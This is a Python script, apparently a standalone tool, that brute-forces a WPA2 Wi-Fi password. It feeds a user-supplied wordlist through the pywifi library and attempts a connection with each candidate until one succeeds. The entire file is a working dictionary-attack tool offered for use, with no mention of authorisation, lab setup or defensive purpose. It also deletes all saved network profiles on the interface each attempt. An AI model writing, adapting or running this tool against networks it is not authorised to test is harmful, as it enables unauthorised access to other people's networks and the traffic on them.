import os
import time

import pywifi
from pywifi import PyWiFi, const, Profile

def main(ssid, password):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.5) 
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) 

    if iface.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print("[+] Password Found!")
        print("[+] Password is: " + password)
        #success
        time.sleep(1)
        return "Success"
    else:
        print('[-] Password Not Found! : ' + password)

def pwd(ssid, file):
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            line = line.strip()  # Remove leading/trailing whitespaces and newline characters
            result = main(ssid, line)
            if result == "Success":
                break

def menu():
    ssid = input("[*] SSID: ") # wifi name
    file = input("[*] Passwords File (full path): ") # file name (with the password)

    if os.path.exists(file):
        print("[~] Cracking...")
        pwd(ssid, file)
    else:
        print("[-] File Not Found!")

if __name__ == "__main__":
    menu()
